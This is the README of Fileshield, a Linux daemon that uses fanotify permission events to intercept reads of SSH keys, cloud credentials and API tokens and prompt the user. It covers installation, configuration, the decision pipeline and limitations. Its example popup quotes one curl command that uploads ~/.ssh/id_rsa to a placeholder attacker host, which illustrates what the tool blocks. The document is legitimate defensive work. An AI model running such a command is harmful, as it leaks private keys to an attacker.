# Fileshield

Fileshield is a Linux security daemon that intercepts file access to sensitive files **before the read completes** and prompts the operator to allow or deny it. Built on `fanotify` permission events — the same kernel mechanism used by Linux antivirus scanners — it suspends the `open()` syscall until a decision is made. The file data is never exposed until you click Allow.

**Zero external dependencies.** Written in C99, requires only libc and Linux kernel headers. No runtime libraries, no package dependencies beyond `kdialog` for GUI prompts.

It watches cloud credentials, SSH keys, kubeconfig, API tokens and other sensitive files, blocking processes that try to read them — an agent accidentally pulling `~/.aws/credentials` into a prompt, a compromised VS Code extension scanning for API keys, or a supply-chain attack replacing a trusted tool.

Fileshield is a backstop for when other sandbox measures fail — not a definitive security tool. It is not a substitute for sandboxing, least-privilege users, or a secret manager.

## Features

- **True pre-access blocking** — the kernel suspends the syscall until Fileshield responds; no race condition
- **Interactive prompts** — a single `kdialog --menu` popup before any data is exposed; inherits your session's Qt theme
- **Scoped decisions** — Allow Once (cached TTL), Allow Session (until shell exits), Allow Always (persistent, fingerprinted rule), plus matching deny scopes
- **Hash-pinned allowlists** — `[allowlist]` rules record SHA-512 on first use and prompt if the binary ever changes
- **Security tripwires** — `[unsafe_allowlist]` grants and `[denylist]` blocks raise desktop notifications on first hit
- **SRE secrets covered by default** — AWS, kubeconfig, SSH keys, GCP, Azure, Vault, Docker config, and more out of the box

## Requirements

- Linux kernel **5.0+** (5.1+ recommended)
- **`kdialog`** — for GUI popups (part of KDE; works in other desktops too)
- **`notify-send`** (libnotify) — optional, for rule-hit desktop notifications
- On non-KDE desktops: a Qt platform theme integration (e.g. `qgnomeplatform`/adwaita-qt for GNOME) if you want the dialog to match the system theme

## Installation

### 1. Install kdialog

```bash
# Debian/Ubuntu
sudo apt install kdialog

# Fedora
sudo dnf install kdialog

# Arch
sudo pacman -S kdialog
```

### 2. Build and install

```bash
git clone https://github.com/yourusername/fileshield.git
cd fileshield
make
sudo make install
```

`make install` installs the daemon to `/usr/local/sbin/fileshield`, `fileshield-cli` to `/usr/local/bin/fileshield-cli`, the systemd unit, and writes `/etc/fileshield.conf` **only if it does not already exist** — reinstalls keep your local rules.

To replace the config with shipped defaults (discards local edits — back up first):

```bash
sudo make install REPLACE_CONFIG=1
# or
sudo make install-config
```

### 3. Start

```bash
sudo systemctl enable --now fileshield
```

The daemon requires root (`CAP_SYS_ADMIN`) to open a `fanotify` permission fd — this is a kernel requirement.

## Configuration

Edit `/etc/fileshield.conf`. Five sections:

| Section              | Purpose                                                          |
| -------------------- | ---------------------------------------------------------------- |
| `[protected_paths]`  | Which files/directories to watch (globs and `!` exclusions)      |
| `[allowlist]`        | Hash-pinned auto-allow for trusted tools                         |
| `[unsafe_allowlist]` | Auto-allow without hash pinning (for AppImages, tmp-mount tools) |
| `[denylist]`         | Hard deny, evaluated before any grant                            |
| `[settings]`         | Cache TTLs, session caps, notification toggles                   |

Reload after editing:

```bash
sudo systemctl reload fileshield
```

The default protected-paths list covers shell histories, SSH/GPG keys, cloud CLIs, Kubernetes configs, container registries, package-manager tokens, password managers and AI coding agents.

→ **Full configuration guide**: [docs/configuration.md](docs/configuration.md)

## Usage

When an unknown process tries to read a protected file, the kernel blocks it and a popup appears:

```
Process curl (PID 4521, parent: bash) wants to read:
  Binary:  /tmp/curl
  Command: curl -s https://evil.example.com --upload-file ~/.ssh/id_rsa
  Path:    /home/user/.ssh/id_rsa

  [Allow Once]   [Allow Session]   [Allow Always]
  [Deny Once]    [Deny Session]     [Deny Always]
```

- **Allow Once** — cached for `user_ttl` seconds (default 300)
- **Allow Session** — until the shell session ends
- **Allow Always** — persistent rule bound to binary hash, call chain, file and command line
- **Deny** rows block with matching scopes
- Cancel/close/timeout → deny (fail closed)

→ **Decision scopes and persistence**: [docs/decision-scopes.md](docs/decision-scopes.md)

## Command-Line Management

`fileshield-cli` lists, describes, removes, clears and prunes persisted rules and pins, and manages live session rules — no hand-editing JSON required.

```bash
fileshield-cli list                         # all rules and pins
fileshield-cli describe allow dd8bf55d      # full detail for one entry
fileshield-cli remove allow dd8bf55d        # remove a rule
fileshield-cli prune --dry-run              # preview duplicate cleanup
fileshield-cli session list                 # live session rules
fileshield-cli reload                       # trigger daemon reload
```

→ **Full CLI reference**: [docs/cli.md](docs/cli.md)

## Architecture

The decision pipeline runs for every `FAN_OPEN_PERM` event:

```
config denylist → session deny → runtime deny → file cache →
session allow → runtime allow → [unsafe_allowlist] →
hash-pinned [allowlist] → kdialog prompt → FAN_ALLOW / FAN_DENY
```

A denial always wins over any grant. Hard-link opens through unprotected paths always prompt.

→ **Full pipeline diagram and internals**: [docs/architecture.md](docs/architecture.md)

## Troubleshooting

- **No popups?** Verify `kdialog` is installed and the desktop session is active. Missing/failing kdialog denies access (fail closed).
- **Dialog theme mismatch?** On non-KDE desktops, install a Qt platform theme integration (`qgnomeplatform`, `adwaita-qt`, `qt6ct`).
- **Access blocked for a trusted process?** Add it to `[allowlist]` and reload. If already allowlisted, check for a hash-change prompt.
- **Daemon won't start?** Must run as root. Check `journalctl -u fileshield -p err`.

→ **Detailed troubleshooting**: [docs/troubleshooting.md](docs/troubleshooting.md)

## Logs

```bash
journalctl -u fileshield -f          # live events
journalctl -u fileshield -p err      # errors only
```

→ **Log levels, foreground mode, ASan, dry-run**: [docs/debugging.md](docs/debugging.md)

## Building and Testing

```bash
make          # build daemon + CLI
make test     # run all unit tests
make lint     # cppcheck static analysis
make bench    # hot-path microbenchmarks
make clean    # remove artifacts
make debug    # ASan/UBSan build
```

## Limitations

- Root processes can bypass fanotify
- Requires a desktop session for GUI prompts; headless hosts deny all unknown accesses
- `fanotify` marks do not propagate to NFS/CIFS mounts
- Bind mounts and `mmap` accesses are outside the threat model
- Config reload is not atomic (short unmediated window during admin-triggered reload)
- Config caps: 1024 protected entries, 128 rules per section — hard refusals

→ **Full limitations list**: [docs/limitations.md](docs/limitations.md)

## License

MIT License. See [LICENSE](LICENSE) for details.

---

> **Fork notice:** This repository was originally forked from [YoranSys/FileShield](https://github.com/YoranSys/FileShield), but has diverged significantly and is for all intents and purposes a new project which uses a completely different permission model.
